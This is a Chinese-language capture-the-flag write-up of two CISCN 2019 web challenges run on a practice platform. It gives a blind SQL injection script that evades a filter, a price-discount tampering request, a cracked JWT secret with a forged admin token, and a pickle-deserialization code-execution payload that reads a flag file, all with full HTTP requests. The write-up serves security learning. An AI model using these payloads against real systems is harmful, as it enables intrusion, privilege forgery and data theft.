# CISCN 2019

## Hack World

> *2021/07/12*

### 题目

进去是一个登录页面，输入试一下，发现1,2是正常回显，之后就不是了，很明显是一个数字型的注入

![202107121](img/ciscn2019/ciscn20191.png)

测试一下过滤了哪些字符，`space`,`union`,`|`,`%`等被过滤掉了，但是`()`,`ascii`,`database()`,`substr()`等并没有被过滤，关键是把后面和前面连接起来，这里有两种方法

- `^`
- 直接等于，因为是数字型

盲注跑脚本就可以了

### payload

```python
import requests
import base64
import sys
import string
import hashlib
import io
import time

x = string.printable
flag = ""
url = "http://2ab3de45-45ff-4613-8d75-e1d644e26d7d.node4.buuoj.cn/index.php"
payload={
	"id" : ""
}
try:
	for i in range(0,60):
		for j in x:
			payload["id"] = "(ascii(substr((select(flag)from(flag)),%s,1))=%s)"%(str(i),ord(j))
			s = requests.post(url,data=payload)
			#print(j)
			if "Hello" in s.text:
				flag += j
				print(flag)
				break
			else:
				time.sleep(0.5)
except:
	print(flag)
```

## ikun

> *2021/07/31*

### 题目

进去之后是一个页面

![ciscn20192](img/ciscn2019/ciscn20192.png)

像是个买东西的页面的题，先翻翻页面，发现`hint:<!--这题脑洞确实有点大,所以我们留了些hint,请注意!-->`，先注册个账号登录一下，登录进去之后，发现有个钱包，还能改密码

![ciscn20193](img/ciscn2019/ciscn20193.png)

那就回到起始页面买东西，翻了好几页都没`lv6`，直接脚本，在`page=181`发现了`lv6`

![ciscn20194](img/ciscn2019/ciscn20194.png)

但是这个很贵，先尝试买一下

![ciscn20195](img/ciscn2019/ciscn20195.png)

数据包为

```http
POST /shopcar HTTP/1.1
Host: ea93bfc8-7221-49d4-a98b-7a3d80bce4b7.node4.buuoj.cn
Content-Length: 106
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://ea93bfc8-7221-49d4-a98b-7a3d80bce4b7.node4.buuoj.cn
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://ea93bfc8-7221-49d4-a98b-7a3d80bce4b7.node4.buuoj.cn/shopcar
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17a7701d69cded-0a36b994c25fd8-6373264-384000-17a7701d69d9e0; _xsrf=2|7c738142|da3ab02634ef6adb6b9c38b8dd514832|1627789342; JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJtZSJ9.vGqzFUXa5GlwytV3Ed0P0ixEGWXpyOe4vRxF3_mLdYc; PHPSESSID=c1e23426d03fb6dbf072022b03068182; commodity_id="2|1:0|10:1627789758|12:commodity_id|8:MTYyNA==|e95ad6adfd8d48691ed98475b441870d89d3e759d17a548ca76d29d03d2479fc"
Connection: close

_xsrf=2%7Cbe640ba8%7C182d3accf6f8e031a98bb2521f46c2d8%7C1627789342&id=1624&price=1145141919.0&discount=0.8
```

看到数据包有两种猜测

- 改`price`，使得价格变得很小
- 改`discount`，是折扣变得很多

这里是改`discount`，成功买到`lv6`，进入下一个页面

![ciscn20196](img/ciscn2019/ciscn20196.png)

发现这个页面需要我们伪造`admin`身份，看了一下`cookie`，包含JWT token，拿到`jwt.io`看一下

![ciscn20197](img/ciscn2019/ciscn20197.png)

大概率是**伪造JWT token**，先拿工具跑一下

![ciscn20198](img/ciscn2019/ciscn20198.png)

破解出密码为`1Kun`，修改COOKIE，进入页面

![ciscn20199](img/ciscn2019/ciscn20199.png)

搜索页面，发现hint，可以下载源代码，找到对应页面的逻辑

```python
# main.py
import tornado.web
import tornado.ioloop
import tornado.httpserver
import tornado.options
from tornado.options import options, define

define('port', default=8233, help='run on the given port', type=int)
define('address', default='0.0.0.0', help='binding at given address', type=str)

from sshop import Application

def main():
    tornado.options.parse_command_line()
    server = tornado.httpserver.HTTPServer(Application())
    server.listen(options.port, options.address)
    print 'slog server started: <http://%s:%s>' % (options.address, options.port)
    tornado.ioloop.IOLoop.instance().start()


if __name__ == '__main__':
    main()
```

```python
# /sshop/views/Admin.py
import tornado.web
from sshop.base import BaseHandler
import pickle
import urllib


class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user == "admin":
            return self.render('form.html', res='This is Black Technology!', member=0)
        else:
            return self.render('no_ass.html')

    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)
```

很明显的pickle反序列化漏洞，同时根据`print`的写法，判断这个应该是2.x的python，直接反序列化打过去就可以，需要注意的是，pickle的反序列化目前有四个版本，最新的为4，而2.x用的是0，如果脚本用的是高版本python，如3.9需要修改参数

### payload

```python
# exp.py
import pickle
import urllib
import requests


class payload(object):
    def __reduce__(self):
        return (eval, ("open('/flag.txt','r').read()", ))


print(urllib.parse.quote(pickle.dumps(payload(), protocol=0)))
```

```http
POST /b1g_m4mber HTTP/1.1
Host: ea93bfc8-7221-49d4-a98b-7a3d80bce4b7.node4.buuoj.cn
Content-Length: 172
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://ea93bfc8-7221-49d4-a98b-7a3d80bce4b7.node4.buuoj.cn
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://ea93bfc8-7221-49d4-a98b-7a3d80bce4b7.node4.buuoj.cn/b1g_m4mber
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17a7701d69cded-0a36b994c25fd8-6373264-384000-17a7701d69d9e0; _xsrf=2|7c738142|da3ab02634ef6adb6b9c38b8dd514832|1627789342; commodity_id="2|1:0|10:1627789758|12:commodity_id|8:MTYyNA==|e95ad6adfd8d48691ed98475b441870d89d3e759d17a548ca76d29d03d2479fc"; PHPSESSID=c1e23426d03fb6dbf072022b03068182; JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo
Connection: close

_xsrf=2%7C46ad4fdc%7Ce0e47eb80e31a4455142f626e78f86ac%7C1627789342&become=c__builtin__%0Aeval%0Ap0%0A%28Vopen%28%27/flag.txt%27%2C%27r%27%29.read%28%29%0Ap1%0Atp2%0ARp3%0A.
```

